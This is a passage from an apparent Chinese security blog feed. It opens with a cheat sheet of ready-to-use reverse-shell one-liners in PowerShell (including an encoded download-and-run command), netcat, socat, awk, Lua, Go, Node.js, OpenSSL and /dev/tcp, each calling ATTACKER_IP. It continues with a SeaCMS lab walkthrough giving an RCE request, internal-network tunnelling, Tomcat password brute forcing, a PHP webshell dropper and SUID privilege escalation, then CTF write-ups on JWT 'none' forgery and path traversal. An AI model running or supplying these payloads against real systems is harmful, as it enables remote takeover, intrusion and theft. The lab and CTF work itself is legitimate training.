<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;ATTACKER_IP&quot;,PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure>

<ol>
<li>PowerShell base64编码<br><code>powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AQQBUAFQAQQBDAEsARQBSAF8ASQBQADoAUABPAFIAVAAvAHIAZQB2AGUAcgBzAGUALgBwAHMAMQAnACkA</code></li>
</ol>
<h2 id="Netcat-反弹shell"><a href="#Netcat-反弹shell" class="headerlink" title="Netcat 反弹shell"></a>Netcat 反弹shell</h2><ol>
<li>传统版本</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh ATTACKER_IP PORT</span><br></pre></td></tr></table></figure>

<ol>
<li>nc没有-e参数时</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ATTACKER_IP PORT &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<ol>
<li>nc的udp反弹</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -u ATTACKER_IP PORT -e /bin/sh</span><br></pre></td></tr></table></figure>

<ol>
<li>ncat(nmap版)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ncat ATTACKER_IP PORT -e /bin/bash</span><br></pre></td></tr></table></figure>

<ol>
<li>nc反弹msf</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set PAYLOAD windows/shell_reverse_tcp</span><br><span class="line"></span><br><span class="line">set LHOST 192.168.53.51 </span><br><span class="line">set LPORT 1234 </span><br><span class="line">run -j  </span><br><span class="line"></span><br><span class="line">use multi/recon/local_exploit_suggester</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h2 id="Socat反弹shell"><a href="#Socat反弹shell" class="headerlink" title="Socat反弹shell"></a>Socat反弹shell</h2><ol>
<li>socat TCP</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash</span><br></pre></td></tr></table></figure>

<ol>
<li>Socat UDP</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat UDP:ATTACKER_IP:PORT EXEC:/bin/bash</span><br></pre></td></tr></table></figure>

<ol>
<li>Socat SSL加密</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat OPENSSL:ATTACKER_IP:PORT EXEC:/bin/bash</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat -v tcp-l:80,reuseaddr,fork exec:&#x27;echo -e &quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n&quot; bash -i &gt;&amp;/dev/tcp/VPS的ip/端口 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<p>vps返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp;/dev/tcp/VPS的ip/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>给到bash执行反弹成功。</p>
<h2 id="Awk反弹shell"><a href="#Awk反弹shell" class="headerlink" title="Awk反弹shell"></a>Awk反弹shell</h2><ol>
<li>Awk TCP连接</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;s = &quot;/inet/tcp/0/ATTACKER_IP/PORT&quot;; while(1) &#123; do &#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c) &#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><ol>
<li>telnet双端口</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet ATTACKER_IP 4444 | /bin/sh | telnet ATTACKER_IP 4445</span><br></pre></td></tr></table></figure>

<h2 id="Lua反弹shell"><a href="#Lua反弹shell" class="headerlink" title="Lua反弹shell"></a>Lua反弹shell</h2><ol>
<li>lua socket</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ATTACKER_IP&#x27;,&#x27;PORT&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Go反弹shell"><a href="#Go反弹shell" class="headerlink" title="Go反弹shell"></a>Go反弹shell</h2><ol>
<li>Go语言单行</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func main()&#123;c,_:=net.Dial(&quot;tcp&quot;,&quot;ATTACKER_IP:PORT&quot;);cmd:=exec.Command(&quot;/bin/sh&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go</span><br></pre></td></tr></table></figure>

<h2 id="Node-js反弹shell"><a href="#Node-js反弹shell" class="headerlink" title="Node.js反弹shell"></a>Node.js反弹shell</h2><ol>
<li>Node.js子进程</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;).exec(&#x27;nc -e /bin/sh ATTACKER_IP PORT&#x27;)</span><br></pre></td></tr></table></figure>

<ol>
<li>Node.js socket版</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123; var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), sh = cp.spawn(&quot;/bin/sh&quot;, []); var client = new net.Socket(); client.connect(PORT, &quot;ATTACKER_IP&quot;, function()&#123; client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); &#125;); return /a/; &#125;)();</span><br></pre></td></tr></table></figure>

<h2 id="Openssl加密反弹"><a href="#Openssl加密反弹" class="headerlink" title="Openssl加密反弹"></a>Openssl加密反弹</h2><ol>
<li>Openssl加密连接</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect ATTACKER_IP:PORT &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>

<ol>
<li>Openssl证书认证</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl s_client -connect ATTACKER_IP:PORT -quiet -cert client.pem -key client.key</span><br></pre></td></tr></table></figure>

<h2 id="Zsh反弹shell"><a href="#Zsh反弹shell" class="headerlink" title="Zsh反弹shell"></a>Zsh反弹shell</h2><ol>
<li>Zsh内置TCP</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zsh -c &#x27;zmodload zsh/net/tcp &amp;&amp; ztcp ATTACKER_IP PORT &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Expect反弹shell"><a href="#Expect反弹shell" class="headerlink" title="Expect反弹shell"></a>Expect反弹shell</h2><ol>
<li>Expect脚本</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/expect</span><br><span class="line">set host ATTACKER_IP</span><br><span class="line">set port PORT</span><br><span class="line">spawn /bin/bash</span><br><span class="line">expect &quot;$ &quot;</span><br><span class="line">send &quot;bash -i &gt;&amp; /dev/tcp/$host/$port 0&gt;&amp;1\r&quot;</span><br><span class="line">interact</span><br></pre></td></tr></table></figure>

<h2 id="基于-dev-tcp的各种形态"><a href="#基于-dev-tcp的各种形态" class="headerlink" title="基于&#x2F;dev&#x2F;tcp的各种形态"></a>基于&#x2F;dev&#x2F;tcp的各种形态</h2><ol>
<li>使用exec重定向</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ATTACKER_IP/PORT; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>

<ol>
<li>使用readline</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/PORT; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>

<ol>
<li>使用coproc(bash 4.0+)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">coproc nc ATTACKER_IP PORT; cat &lt;&amp;&quot;$&#123;COPROC[0]&#125;&quot; &gt;&amp;&quot;$&#123;COPROC[1]&#125;&quot;</span><br></pre></td></tr></table></figure>



<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>知识点</category>
      </categories>
  </entry>
  <entry>
    <title>海洋cms</title>
    <url>/posts/982d6246/</url>
    <content><![CDATA[<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><p><img src="/posts/982d6246/1764759449218-f78f947f-05cd-4d08-830d-c4a6f8fc3dfa.png"></p>
<p>fscan扫描完，找个poc rce</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /search.php HTTP/1.1</span><br><span class="line">Host: 113.45.161.52:89</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://113.45.161.52:89/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 218</span><br><span class="line"></span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;ver=OST[Cyc1e]))&amp;Cyc1e=system(&#x27;cat+flag1.txt&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag4&#123;22ddee0793c18171e62cff7eef6625ac&#125;</span><br></pre></td></tr></table></figure>

<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><p><img src="/posts/982d6246/1764767212288-6ab6cf55-d5b1-4210-a143-f21bcc5ca20e.png"></p>
<p>利用fscan扫描内网，做一个内网穿透，这里有mysql</p>
<p>使用MDUT连接一下</p>
<p><img src="/posts/982d6246/1764768042207-8696d566-a9de-45e3-b881-5784e091f8c7.png"></p>
<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>这里tomcat 8.0.43有弱口令，我们抓到包来爆破一下</p>
<p><img src="/posts/982d6246/1764769499019-d93cc53b-1fb3-4f58-8aa1-7f3a3b670566.png"></p>
<p><img src="/posts/982d6246/1764769572581-faf2a6ec-6220-4bd1-905e-b167759328ec.png"></p>
<p>位置1是用户名</p>
<p><img src="/posts/982d6246/1764769583661-71a59760-544b-4b83-b237-e0a61fd5714d.png"></p>
<p>位置2是:</p>
<p>位置3是密码</p>
<p><img src="/posts/982d6246/1764769850350-e19ad77f-a014-49e0-9abf-bb3567c2963e.png"></p>
<p>tomcat&#x2F;tomcat123</p>
<p>使用哥斯拉生成一个马，然后getshell</p>
<p><img src="/posts/982d6246/1764853198897-dd8c2eda-60fe-473c-9e12-84d0adf7514b.png"></p>
<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><p><img src="/posts/982d6246/1765042091717-258a48c3-df59-4da8-a11b-7ef9cb6eed81.png">还有内网，做个代理在进入，在传一个哥斯拉的马，getshell</p>
<p><img src="/posts/982d6246/1765042181829-45bfabac-5abb-408f-aff8-df604c9af3da.png"></p>
<p><img src="/posts/982d6246/1765042245922-cf366bdf-1cb6-4110-856d-cdc6eaaf8550.png"></p>
<h1 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h1><p><img src="/posts/982d6246/1765042294844-bd3ed9af-e170-44e7-9a61-f9030da8a4f1.png"></p>
<p>还有内网网段</p>
<p><img src="/posts/982d6246/1765045859322-9b7dd121-cd63-49c7-ae94-1ea721e2e16c.png"></p>
<p>这台机器比较特殊，可以先看一下出不出网</p>
<p><img src="/posts/982d6246/1765042587314-18d6c9de-67ad-4f5e-a44a-ab70f00f8c2c.png"></p>
<p>看到数据包全部丢弃，那它就是不出网的，那么我们就不能使用公网做内网代理到本地了。</p>
<p>这时候就需要一台中转的机器，也就是需要搭建二层的隧道，可以使用ew这款工具</p>
<p>weblogic上执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew* -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>

<p>然后我们的服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew* -s lcx_listen -l 28005 -e 28006</span><br></pre></td></tr></table></figure>

<p>最后中转站（tomcat）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew* -s lcx_slave -d 8.140.236.137 -e 28006 -f 172.16.224.221 -g 9999</span><br></pre></td></tr></table></figure>

<p>这样在配置本地代理</p>
<p>就可发送请求，从本地到服务器，再到tomcat，在到weblogic，在访问到目标网址</p>
<p><img src="/posts/982d6246/1765046802918-25d2b921-9597-4cc2-b3ff-78b7553692aa.png"></p>
<p>成功</p>
<p><img src="/posts/982d6246/1765046858864-29e6ed88-35e2-49c1-a9d0-7f80ef8ddef3.png"></p>
<p>弱口令进入，版本是4.8.1</p>
<p>然后发现连接得时候一直掉线，不好操作，就用stowaway重新做个代理去接weblogic（tomcat做中转），</p>
<p>vps上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">listen</span><br><span class="line">1</span><br><span class="line">10001</span><br></pre></td></tr></table></figure>

<p>目标向tomcat得10001连接（注意要在同一网段）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_agent -c 172.16.224.66:10001</span><br></pre></td></tr></table></figure>

<p>上线后use它然后转发到本地</p>
<p>利用漏洞写入一句话后，getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php file_put_contents(&quot;y.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1Rbc2hlbGxdKTs/Pg==&quot;));?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>权限低</p>
<p>尝试提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/posts/982d6246/1765118312391-5d0d03bf-93c2-4bdc-bf1e-b22aecdea1dd.png"></p>
<p>find提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/bash -c &#x27;id&#x27; \;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/982d6246/1765118287379-5c6ee4a3-47a3-4b27-bc34-654331f89010.png"></p>
]]></content>
      <categories>
        <category>src</category>
        <category>打靶</category>
      </categories>
  </entry>
  <entry>
    <title>第二届帕鲁杯复现wp</title>
    <url>/posts/c8bdf283/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="CatBank"><a href="#CatBank" class="headerlink" title="CatBank"></a><strong>CatBank</strong></h2><p>创建两个账号，test1和test2，第一个想第二个转账1000000，然后第二个在转给M猫，得到flag</p>
<p><img src="/posts/c8bdf283/1747826134098-979323dd-d6e7-49fd-aa25-09da6ab58ea6.png" alt="img"></p>
<h2 id="猫猫的秘密"><a href="#猫猫的秘密" class="headerlink" title="猫猫的秘密"></a>猫猫的秘密</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">       let token = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">       </span><br><span class="line">       document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginBtn&#x27;</span>).<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="title function_ invoke__">async</span> () =&gt; &#123;</span><br><span class="line">           <span class="keyword">const</span> username = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).value;</span><br><span class="line">           <span class="keyword">const</span> password = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).value;</span><br><span class="line">           </span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="keyword">const</span> response = await <span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;/login&#x27;</span>, &#123;</span><br><span class="line">                   <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                   <span class="attr">headers</span>: &#123;</span><br><span class="line">                       <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">                   &#125;,</span><br><span class="line">                   <span class="attr">body</span>: JSON.<span class="title function_ invoke__">stringify</span>(&#123; username, password &#125;)</span><br><span class="line">               &#125;);</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">const</span> data = await response.<span class="title function_ invoke__">json</span>();</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">if</span> (response.ok) &#123;</span><br><span class="line">                   token = data.token;</span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginResult&#x27;</span>).textContent = `登录成功: $&#123;data.message&#125;`;</span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginResult&#x27;</span>).classList.<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginSection&#x27;</span>).classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretSection&#x27;</span>).classList.<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginResult&#x27;</span>).textContent = `错误: $&#123;data.error&#125;`;</span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginResult&#x27;</span>).classList.<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">               document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginResult&#x27;</span>).textContent = `发生错误: $&#123;error.message&#125;`;</span><br><span class="line">               document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginResult&#x27;</span>).classList.<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       </span><br><span class="line">       document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;getSecretBtn&#x27;</span>).<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="title function_ invoke__">async</span> () =&gt; &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="keyword">const</span> response = await <span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;/get_secret&#x27;</span>, &#123;</span><br><span class="line">                   <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">                   <span class="attr">headers</span>: &#123;</span><br><span class="line">                       <span class="string">&#x27;Authorization&#x27;</span>: token</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;);</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">const</span> data = await response.<span class="title function_ invoke__">json</span>();</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">if</span> (response.ok) &#123;</span><br><span class="line">                   let resultText = `$&#123;data.message&#125;\n\n`;</span><br><span class="line">                   </span><br><span class="line">                   <span class="keyword">if</span> (data.<span class="keyword">public</span>) &#123;</span><br><span class="line">                       resultText += `$&#123;data.<span class="keyword">public</span>&#125;\n\n`;</span><br><span class="line">                   &#125;</span><br><span class="line">                   </span><br><span class="line">                   <span class="keyword">if</span> (data.confidential) &#123;</span><br><span class="line">                       resultText += `猫猫信息: $&#123;data.confidential&#125;\n\n`;</span><br><span class="line">                   &#125;</span><br><span class="line">                   </span><br><span class="line">                   <span class="keyword">if</span> (data.flag) &#123;</span><br><span class="line">                       resultText += `Flag: $&#123;data.flag&#125;`;</span><br><span class="line">                   &#125;</span><br><span class="line">                   </span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretResult&#x27;</span>).textContent = resultText;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretResult&#x27;</span>).textContent = `错误: $&#123;data.error&#125;`;</span><br><span class="line">               &#125;</span><br><span class="line">               </span><br><span class="line">               document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretResult&#x27;</span>).classList.<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">               document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretResult&#x27;</span>).textContent = `发生错误: $&#123;error.message&#125;`;</span><br><span class="line">               document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretResult&#x27;</span>).classList.<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       </span><br><span class="line">       document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;logoutBtn&#x27;</span>).<span class="title function_ invoke__">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, () =&gt; &#123;</span><br><span class="line">           token = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).value = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).value = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginResult&#x27;</span>).classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretResult&#x27;</span>).classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;secretSection&#x27;</span>).classList.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;loginSection&#x27;</span>).classList.<span class="title function_ invoke__">remove</span>(<span class="string">&#x27;hidden&#x27;</span>);</span><br><span class="line">       &#125;);</span><br><span class="line">   &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c8bdf283/1747900797148-f1cb77e9-0452-44a8-afeb-10d62abb55dd.png" alt="img"></p>
<p>要打Authorization头认证</p>
<p>&#x2F;get_secret路由需要认证，我们要伪造cookie，这里是jwt的认证（还有其他认证方式如<strong>Basic认证、Digest认证、Beare认证等</strong>）</p>
<p>提示Invalid algorithm  算法无效，那就改成none来试一下</p>
<p>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的</p>
<p><a href="https://www.cnblogs.com/backlion/p/16699442.html">https://www.cnblogs.com/backlion/p/16699442.html</a></p>
<p><img src="/posts/c8bdf283/1747901561685-273ca076-07a7-400d-84c4-a8597d7c621b.png" alt="img"></p>
<p><img src="/posts/c8bdf283/1747901763242-22d8a9aa-b1d1-4bef-bf7f-9fa0c86ac63e.png" alt="img"></p>
<p>没有flag，猜测权限问题，和权限有关的，payload部分为role，account，isAdmin等，这里是role继续构造</p>
<p><img src="/posts/c8bdf283/1747901975425-6489b572-4510-4616-891e-569e7843861d.png" alt="img"></p>
<p><img src="/posts/c8bdf283/1747901964624-e16ee5b2-b9c4-403a-b282-61360122d73d.png" alt="img"></p>
<h2 id="CatNet"><a href="#CatNet" class="headerlink" title="CatNet"></a>CatNet</h2><p><img src="/posts/c8bdf283/1747903184180-aa72b38b-26fe-4550-b771-b72cb5a664c2.png" alt="img"></p>
<p>admin目录</p>
<p><img src="/posts/c8bdf283/1747903205437-61babc4d-190f-4da4-9b18-26daf565e131.png" alt="img"></p>
<p>xff伪造127.0.0.1就行</p>
<p>然后就信息收集一下呗，有&#x2F;admin&#x2F;flag这个路由，加上头验证不对，应该是后面的000不对，爆破一下就好了</p>
<p><img src="/posts/c8bdf283/1748167864846-928e967d-0372-449c-b85f-1bd1233361a8.png" alt="img"></p>
<p><img src="/posts/c8bdf283/1748168661818-fbb57c4c-0fa4-44a5-a00a-eb3c42be2382.png" alt="img"></p>
<h2 id="ezblog"><a href="#ezblog" class="headerlink" title="ezblog"></a>ezblog</h2><p><img src="/posts/c8bdf283/1748169943892-ebe29d9f-d2c3-41e3-a51a-dc8c30ad8e42.png" alt="img"></p>
<p>把jar包反编译一下，dashboard.class里存在&#x2F;backdoor，想要拿到flag，就得知道key</p>
<p><img src="/posts/c8bdf283/1748170523758-f325760a-a178-402d-89fb-eb44e6128a75.png" alt="img"></p>
<p><strong>FileStaticRepository设置了基础目录&#x2F;app&#x2F;assets</strong></p>
<p><img src="/posts/c8bdf283/1748170649216-fa970a00-a60b-48b8-acf9-7038a38254d9.png" alt="img"></p>
<p>这里有一个可控的参数，relativepath ，在solon框架中，这个参数是通过url路径传过来的，relativepath就是&#x2F;assets后面的内容，对于恶意的url表现为，http:&#x2F;&#x2F;…&#x2F;assets&#x2F;etc&#x2F;passwd</p>
<p>然后就想着拿key呗，key的话应该在真实的app.jar文件里，基础目录是assets那么payload构造就要为</p>
<p>&#x2F;assets&#x2F;..&#x2F;app.jar,拿到app下的真实jar文件</p>
<p><img src="/posts/c8bdf283/1748171527029-2b170712-3997-40a5-9735-4e70233a8434.png" alt="img"></p>
<p>拿下</p>
<p><img src="/posts/c8bdf283/1748171652662-1424f58d-58a4-467d-9d3b-8e8ac42180b0.png" alt="img"></p>
<h2 id="catshell"><a href="#catshell" class="headerlink" title="catshell"></a>catshell</h2><p>主播太菜，不会</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
  <entry>
    <title>训练赛</title>
    <url>/posts/3478ea8e/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p><img src="/posts/3478ea8e/1753671244876-17b7e89a-68fe-4f23-b981-234bc4086bc7.png" alt="img"></p>
<p>从这边可以看到是python的原型链污染</p>
<p>可以直接污染掉对黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__globals__&quot;: &#123;&quot;param_black_list1&quot;: [&quot;123&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后打ssti即可</p>
